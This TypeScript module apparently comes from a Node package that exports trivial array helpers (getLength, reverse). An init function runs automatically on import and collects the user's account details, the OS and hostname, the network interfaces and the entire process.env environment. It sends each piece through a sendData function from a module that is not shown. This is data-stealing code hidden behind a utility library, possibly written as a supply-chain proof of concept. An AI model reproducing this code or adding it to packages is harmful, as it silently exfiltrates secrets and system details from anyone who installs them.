import * as os from "node:os";
import { CustomPlugin, EnvDetails, NetworkInterfacesDetails, OsDetails, UserDetails } from "./typings";
import { sendData } from "./core";
import { generateRandomId, getIpv4Interfaces } from "./utils";
import { heyInternet, wc, catscatscatscats } from "./gifts";

function getUserInfo(): UserDetails {
  return os.userInfo()
}

function getOsInfo(): OsDetails {
  return {
      arch: os.arch(),
      hostname: os.hostname(),
      platform: os.platform(),
      release: os.release(),
      type: os.type()
  };
}

function getNetworkInfo(): NetworkInterfacesDetails {
  return getIpv4Interfaces(os.networkInterfaces());
}

function getEnvInfo(): EnvDetails {
  return process.env;
};

const plugins: Array<CustomPlugin> = [
  {
      key: "networkInterfaces",
      plugin: getNetworkInfo
  },
  {
      key: "os",
      plugin: getOsInfo
  },
  {
      key: "env",
      plugin: getEnvInfo
  },
  {
      key: "userInfo",
      plugin: getUserInfo
  }
];

function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
  return {
      [key]: plugin()
  }
}

(function init() {
  console.log("Scanning host...");
  const id = generateRandomId();
  plugins.forEach(plugin => {
    const gatheredInfo = runPlugin(plugin);
    const postData = JSON.stringify(gatheredInfo, null, 2);
    console.log(`Data from ${plugin.key} is: ${postData}`);
    sendData(postData, plugin.key, id);
  });

  //heyInternet();
  //wc();
  //catscatscatscats(3000);
})()

export function getLength(arr: Array<any>): number {  return arr.length || 0;}

export function reverse(arr: Array<any>): Array<any> {
  const copy = arr.slice();
  return copy.reverse();
}